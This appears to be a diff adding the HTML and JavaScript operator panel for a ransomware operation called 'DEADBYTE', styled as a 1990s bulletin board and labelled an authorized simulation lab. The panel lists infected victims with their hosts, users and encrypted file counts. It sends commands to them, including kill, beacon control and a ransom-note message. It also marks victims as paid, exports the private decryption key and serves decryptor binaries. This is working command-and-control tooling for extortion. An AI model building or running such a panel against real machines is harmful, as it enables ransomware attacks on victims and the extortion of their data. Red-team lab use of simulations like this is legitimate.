@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>DEADBYTE BBS v1.1 // CRYPTO:DIVISION</title>
+<style>
+/* ============================================================
+   DEADBYTE BBS - operations panel, 1996 style.
+   green phosphor, 16-color ansi, no bootstrap, no framework.
+   if you do not like it, turn off the monitor.
+   ============================================================ */
+:root{
+  --bg:#020402;
+  --grn:#7dff8a;      /* phosphor */
+  --tx:#a8ffb0;
+  --dim:#3f6f45;
+  --amb:#ffb000;      /* ansi amber */
+  --cyn:#6fd3ff;      /* ansi cyan */
+  --red:#ff4a3c;      /* ansi red */
+  --ln:#1d331f;
+  --ln2:#2e4a30;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{
+  background:var(--bg);
+  color:var(--tx);
+  font:13px/1.5 "Lucida Console","Courier New",Consolas,monospace;
+  padding:10px 12px 58px;
+  text-shadow:0 0 6px rgba(120,255,140,.35);
+  animation:flick 4s infinite;
+}
+/* CRT scanlines */
+body::after{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:99;
+  background:repeating-linear-gradient(0deg,rgba(0,0,0,.25) 0 1px,transparent 1px 3px);
+}
+@keyframes flick{0%,100%{opacity:1}50%{opacity:.985}}
+.cur{display:inline-block;color:var(--grn);animation:blink 1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* ansi banner */
+.banner{font-size:11px;line-height:1.05;margin:4px 0 2px;user-select:none;white-space:pre}
+.subline{font-size:11px;letter-spacing:3px;color:var(--dim);margin-bottom:6px}
+.subline b{color:var(--amb)}
+
+/* 90s bbs-style warning strip */
+.ticker{overflow:hidden;white-space:nowrap;border:1px solid var(--ln2);background:#000;font-size:11px;margin-bottom:4px}
+.ticker span{display:inline-block;padding-left:100%;animation:tick 22s linear infinite;color:var(--cyn)}
+@keyframes tick{to{transform:translateX(-100%)}}
+.warnline{font-size:10px;color:var(--red);letter-spacing:2px;text-align:center;border:1px dashed var(--red);padding:2px 0;margin-bottom:10px}
+
+.cols{display:grid;grid-template-columns:1fr 370px;gap:12px;align-items:start}
+@media(max-width:1000px){.cols{grid-template-columns:1fr}}
+.box{border:1px solid var(--ln2);margin-bottom:12px;background:rgba(10,28,12,.18)}
+.boxt{border-bottom:1px solid var(--ln2);color:var(--grn);font-size:11px;letter-spacing:2px;padding:3px 8px;background:var(--ln)}
+.boxt i{color:var(--dim);font-style:normal}
+.box .bd{padding:0}
+table{width:100%;border-collapse:collapse}
+th{text-align:left;color:var(--dim);font-size:10px;text-transform:uppercase;letter-spacing:1px;padding:4px 6px;border-bottom:1px solid var(--ln2)}
+td{padding:5px 6px;border-bottom:1px dotted var(--ln);font-size:12px;vertical-align:top}
+tr.v:hover{background:var(--grn);color:#000;cursor:pointer}
+tr.v:hover td{color:#000}
+tr.v:hover .grp{color:#000}
+tr.v:hover .amb{color:#000}
+.log{font-size:11px;line-height:1.55;max-height:300px;overflow-y:auto;padding:6px 8px}
+.log .l{padding:2px 0;border-bottom:1px dotted var(--ln)}
+.log .t{color:var(--dim);margin-right:6px}
+.log .i{color:var(--cyn)}
+.log .e{color:var(--red)}
+.log .s{color:var(--grn)}
+.kv{font-size:11px;padding:8px;line-height:1.65;white-space:pre-wrap;word-break:break-all}
+.kv b{color:var(--amb)}
+input{background:#000;border:1px solid var(--ln2);color:var(--grn);padding:5px 7px;font:12px "Lucida Console",monospace}
+input:focus{outline:none;border-color:var(--grn);box-shadow:0 0 6px rgba(120,255,140,.4)}
+button{background:#000;border:1px solid var(--ln2);color:var(--grn);padding:4px 10px;font:11px "Lucida Console",monospace;letter-spacing:1px;cursor:pointer;text-transform:uppercase}
+button:hover{background:var(--grn);color:#000;box-shadow:0 0 8px rgba(120,255,140,.5)}
+button.bad{border-color:var(--red);color:var(--red)}
+button.bad:hover{background:var(--red);color:#000}
+button.amb{border-color:var(--amb);color:var(--amb)}
+button.amb:hover{background:var(--amb);color:#000}
+.row{display:flex;gap:6px;flex-wrap:wrap;padding:8px}
+.key{font-size:10px;word-break:break-all;white-space:pre-wrap;background:#000;border:1px solid var(--ln2);padding:8px;margin:8px;max-height:150px;overflow-y:auto}
+.badge{display:inline-block;border:1px solid var(--ln2);padding:0 5px;font-size:10px;letter-spacing:1px}
+.badge.ok{color:var(--grn);border-color:var(--grn)}
+.badge.off{color:var(--red);border-color:var(--red)}
+.badge.paid{color:var(--amb);border-color:var(--amb)}
+.hidden{display:none}
+.grp{color:var(--grn)}
+.amb{color:var(--amb)}
+.cyn{color:var(--cyn)}
+.dim{color:var(--dim)}
+.mono{font-size:11px}
+
+/* barra de status estilo DOS */
+.status{
+  position:fixed;left:0;right:0;bottom:0;z-index:50;
+  background:#000;border-top:1px solid var(--grn);
+  font-size:10px;color:var(--grn);letter-spacing:1px;
+  padding:4px 10px;display:flex;gap:14px;flex-wrap:wrap;align-items:center;
+}
+.status .fk{color:var(--amb)}
+.status .node{color:var(--cyn)}
+.status .slg{color:var(--dim);flex:1;text-align:right}
+#toast{position:fixed;bottom:34px;right:10px;background:#000;border:1px solid var(--amb);color:var(--amb);padding:6px 10px;font-size:11px;display:none;z-index:99}
+#toast.show{display:block}
+</style>
+</head>
+<body>
+<pre class="banner"><span style="color:#ffb000"> ██████╗ </span> <span style="color:#9fdf9f">███████╗</span> <span style="color:#6fd3ff"> █████╗ </span> <span style="color:#ffb000"> ██████╗ </span> <span style="color:#9fdf9f">██████╗ </span> <span style="color:#6fd3ff">██╗   ██╗</span> <span style="color:#ffb000">████████╗</span> <span style="color:#9fdf9f">███████╗</span>
+<span style="color:#ffb000">██╔══██╗</span> <span style="color:#9fdf9f">██╔════╝</span> <span style="color:#6fd3ff">██╔══██╗</span> <span style="color:#ffb000">██╔══██╗</span> <span style="color:#9fdf9f">██╔══██╗</span> <span style="color:#6fd3ff">╚██╗ ██╔╝</span> <span style="color:#ffb000">╚══██╔══╝</span> <span style="color:#9fdf9f">██╔════╝</span>
+<span style="color:#ffb000">██║  ██║</span> <span style="color:#9fdf9f">█████╗  </span> <span style="color:#6fd3ff">███████║</span> <span style="color:#ffb000">██║  ██║</span> <span style="color:#9fdf9f">██████╔╝</span> <span style="color:#6fd3ff"> ╚████╔╝ </span> <span style="color:#ffb000">   ██║   </span> <span style="color:#9fdf9f">█████╗  </span>
+<span style="color:#ffb000">██║  ██║</span> <span style="color:#9fdf9f">██╔══╝  </span> <span style="color:#6fd3ff">██╔══██║</span> <span style="color:#ffb000">██║  ██║</span> <span style="color:#9fdf9f">██╔══██╗</span> <span style="color:#6fd3ff">  ╚██╔╝  </span> <span style="color:#ffb000">   ██║   </span> <span style="color:#9fdf9f">██╔══╝  </span>
+<span style="color:#ffb000">██████╔╝</span> <span style="color:#9fdf9f">███████╗</span> <span style="color:#6fd3ff">██████╔╝</span> <span style="color:#ffb000">██████╔╝</span> <span style="color:#9fdf9f">██████╔╝</span> <span style="color:#6fd3ff">   ██║   </span> <span style="color:#ffb000">   ██║   </span> <span style="color:#9fdf9f">███████╗</span>
+<span style="color:#ffb000">╚═════╝ </span> <span style="color:#9fdf9f">╚══════╝</span> <span style="color:#6fd3ff">╚═════╝ </span> <span style="color:#ffb000">╚═════╝ </span> <span style="color:#9fdf9f">╚═════╝ </span> <span style="color:#6fd3ff">   ╚═╝   </span> <span style="color:#ffb000">   ╚═╝   </span> <span style="color:#9fdf9f">╚══════╝</span><span class="cur">&#9608;</span></pre>
+<div class="subline">DEADBYTE <b>//</b> CRYPTO:DIVISION <b>//</b> NODE 0xDEAD <b>//</b> BBS 8443 <b>//</b> EST.1996</div>
+
+<div class="ticker"><span>*** WELCOME TO THE DEADBYTE NETWORK *** AUTHORIZED SIMULATION *** CRYPTO:DIVISION *** UPLINK: <span id="uplink">NO SIGNAL</span> *** PUBLIC KEY: <span id="pub">...</span> ***</span></div>
+<div class="warnline">!!! WARNING: UNAUTHORIZED ACCESS IS A CRIME - SIMULATION LAB !!!</div>
+
+<div class="cols">
+  <div class="col">
+    <div class="box">
+      <div class="boxt">[ REGISTERED VICTIMS ] <i>// click a row for details</i></div>
+      <div class="bd">
+        <table>
+          <thead><tr><th>id</th><th>host</th><th>user</th><th>so</th><th>fase</th><th>files</th><th>bytes</th><th>status</th><th>sync</th></tr></thead>
+          <tbody id="rows"><tr><td colspan="9" class="dim">sem sinal. esperando beacon...</td></tr></tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="box hidden" id="detbox">
+      <div class="boxt">[ FICHA DA VITIMA ] <i>id: <span id="detid" class="grp"></span></i></div>
+      <pre class="kv" id="detkv"></pre>
+      <div class="boxt" style="border-top:1px solid var(--ln2)">[ VICTIM EVENTS ]</div>
+      <div class="log" id="evs"></div>
+      <div class="row">
+        <button class="bad" onclick="cmd('kill')">&lt; KILL &gt;</button>
+        <button onclick="cmd('beacon_off')">beacon_off</button>
+        <button onclick="cmd('proof')">proof</button>
+        <button class="amb" onclick="cmd('message','__ASK__')">message</button>
+        <button onclick="paid()">mark paid</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="col">
+    <div class="box">
+      <div class="boxt">[ GLOBAL FEED ] <i>// scrollback</i></div>
+      <div class="log" id="feed"></div>
+    </div>
+    <div class="box">
+      <div class="boxt">[ KEYS ]</div>
+      <div class="bd">
+        <div class="dim" style="padding:8px 8px 4px;font-size:11px">admin token (api + artifacts + export)</div>
+        <div style="padding:0 8px 4px"><input type="password" id="tok" placeholder="token" style="width:100%" autocomplete="off"></div>
+        <div class="row" style="padding-top:0"><button class="amb" onclick="dokey()">export private key</button></div>
+        <pre class="key hidden" id="keybox"></pre>
+      </div>
+    </div>
+    <div class="box">
+      <div class="boxt">[ ARTEFATOS ]</div>
+      <div class="bd">
+        <div class="dim" style="padding:8px 8px 4px;font-size:11px">download from /artifacts/ - requires the token above</div>
+        <div style="padding:0 8px 4px"><input id="art" placeholder="deadbyte-decrypt-windows-amd64.exe" style="width:100%"></div>
+        <div class="row" style="padding-top:0"><button onclick="dl()">download</button></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="status">
+  <span class="fk">F1</span><span>sync</span>
+  <span class="fk">F2</span><span>export</span>
+  <span class="fk">F3</span><span>download</span>
+  <span class="fk">F4</span><span>kill</span>
+  <span class="node" id="sync">--:--:--</span>
+  <span>pub: <span id="pub2" class="mono"></span></span>
+  <span class="slg" id="slg">just another log.</span>
+</div>
+<div id="toast"></div>
+
+<script>
+const $=i=>document.getElementById(i);
+const tok=()=>({'Authorization':'Bearer '+($('tok').value||'')});
+let cur=null;
+const SLGS=['just another log.','time to go.','0xDEAD 0xBEEF.','do not feed the botnets.','if you read this, the quantum won.','keep your friends close.','your password is weak.','the system is aware.','logs do not lie.','never in production.'];
+
+async function api(p,o={}){
+  const r=await fetch(p,o);
+  const j=await r.json().catch(()=>({}));
+  if(!r.ok)throw new Error(j.error||r.statusText);
+  return j;
+}
+function toast(m){const t=$('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2600);}
+function ago(ts){
+  if(!ts)return '—';
+  const s=Math.floor(Date.now()/1000-ts);
+  if(s<5)return 'now';
+  if(s<60)return s+'s';
+  if(s<3600)return Math.floor(s/60)+'m';
+  if(s<86400)return Math.floor(s/3600)+'h';
+  return Math.floor(s/86400)+'d';
+}
+function fb(n){
+  if(!n)return '0';
+  const u=['B','K','M','G'];let i=0;
+  while(n>=1024&&i<3){n/=1024;i++}
+  return (n>=100?n.toFixed(0):n.toFixed(1))+' '+u[i];
+}
+function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+
+async function load(){
+  try{
+    const [a,b]=await Promise.all([
+      api('/api/v1/infections',{headers:tok()}),
+      api('/api/v1/events',{headers:tok()})
+    ]);
+    render(a.infections||[]);
+    feed(b.events||[]);
+    $('sync').textContent='SYNC '+new Date().toLocaleTimeString();
+    $('uplink').textContent='OK';
+  }catch(e){$('uplink').textContent='NO SIGNAL';}
+}
+
+function render(list){
+  const tb=$('rows');
+  if(!list.length){tb.innerHTML='<tr><td colspan="9" class="dim">no victims yet. waiting for a beacon...</td></tr>';return;}
+  list.sort((x,y)=>y.first_seen-x.first_seen);
+  tb.innerHTML=list.map(i=>{
+    const st=i.paid?'<span class="badge paid">PAID</span>'
+      :(Date.now()/1000-i.last_seen>300)?'<span class="badge off">OFFLINE</span>'
+      :'<span class="badge ok">ACTIVE</span>';
+    return `<tr class="v" onclick="open('${i.id}')">
+      <td class="mono grp">${i.id}</td>
+      <td>${esc(i.hostname)}</td><td>${esc(i.username)}</td>
+      <td>${esc(i.os)}/${esc(i.arch)}</td>
+      <td class="amb">${esc(i.phase)}</td>
+      <td>${i.files}</td><td>${fb(i.bytes)}</td>
+      <td>${st}</td><td class="mono">${ago(i.last_seen)}</td></tr>`;
+  }).join('');
+}
+
+function lv(e){
+  const cls=e.level==='error'?'e':(e.level==='success'?'s':'i');
+  return `<div class="l"><span class="t">${new Date(e.at*1000).toLocaleTimeString()}</span><b class="${cls}">[${esc(e.level)}]</b> ${esc(e.msg)}${e.inf_id?' <span class="mono dim">('+esc(e.inf_id)+')</span>':''}</div>`;
+}
+function feed(evs){
+  $('feed').innerHTML=evs.slice().reverse().map(lv).join('')||'<div class="l dim">no events yet</div>';
+}
+
+async function open(id){
+  try{
+    const d=await api('/api/v1/infections/'+id,{headers:tok()});
+    cur=d.infection;
+    $('detbox').classList.remove('hidden');
+    $('detid').textContent=cur.id;
+    $('detkv').innerHTML=
+      `<b>host</b>        ${esc(cur.hostname)}\n`+
+      `<b>user</b>     ${esc(cur.username)}\n`+
+      `<b>os</b>          ${esc(cur.os)} ${esc(cur.arch)}\n`+
+      `<b>pid</b>         ${cur.pid}\n`+
+      `<b>payload</b>     ${esc(cur.version)}\n`+
+      `<b>interfaces</b>  ${(cur.interfaces||[]).join(', ')||'—'}\n`+
+      `<b>first beacon</b>   ${new Date(cur.first_seen*1000).toLocaleString()}\n`+
+      `<b>last sync</b> ${new Date(cur.last_seen*1000).toLocaleString()}\n`+
+      `<b>files</b>    ${cur.files}\n`+
+      `<b>bytes</b>       ${fb(cur.bytes)}\n`+
+      `<b>errors</b>       ${cur.errors}\n`+
+      `<b>phase</b>        ${esc(cur.phase)}`+
+      (cur.paid?'\n<b>status</b>      PAID (simulation)':'');
+    $('evs').innerHTML=(d.events||[]).slice().reverse().map(lv).join('')||'<div class="l dim">no events</div>';
+  }catch(e){toast('error: '+e.message);}
+}
+
+async function cmd(t,v){
+  if(!cur)return;
+  if(v==='__ASK__'){
+    v=prompt('message text (ransom note):');
+    if(v===null)return;
+  }
+  try{
+    await api('/api/v1/infections/'+cur.id+'/command',{method:'POST',headers:Object.assign({'Content-Type':'application/json'},tok()),body:JSON.stringify({type:t,value:v||''})});
+    toast('command '+t+' queued');
+  }catch(e){toast('error: '+e.message);}
+}
+async function paid(){
+  if(!cur)return;
+  try{
+    await api('/api/v1/infections/'+cur.id+'/paid',{method:'POST',headers:tok()});
+    toast('marked paid');
+    open(cur.id);load();
+  }catch(e){toast('error: '+e.message);}
+}
+async function dokey(){
+  const t=$('tok').value;
+  if(!t){toast('set the admin token first');return;}
+  try{
+    const k=await api('/api/v1/key/export',{headers:{'Authorization':'Bearer '+t}});
+    const kb=$('keybox');
+    kb.classList.remove('hidden');
+    kb.innerHTML='<b class="amb">PRIVATE (use with deadbyte-decrypt -key)</b>\n'+esc(k.private_key)+'\n\n<b class="dim">PUBLIC (embed in the payload)</b>\n'+esc(k.public_key);
+    toast('key exported');
+  }catch(e){toast('error: '+e.message);}
+}
+function dl(){
+  const n=$('art').value.trim();
+  if(!n){toast('specify the binary');return;}
+  window.open('/artifacts/'+encodeURIComponent(n),'_blank');
+}
+function clk(){
+  $('sync').textContent='SYNC '+new Date().toLocaleTimeString();
+}
+
+api('/api/v1/key/public').then(k=>{$('pub').textContent=k.public_key;$('pub2').textContent=k.public_key;}).catch(()=>{});
+setInterval(()=>{$('slg').textContent=SLGS[Math.floor(Math.random()*SLGS.length)];},5000);
+setInterval(clk,1000);
+load();
+setInterval(()=>{if(!document.hidden)load();},3000);
+</script>
+</body>
+</html>
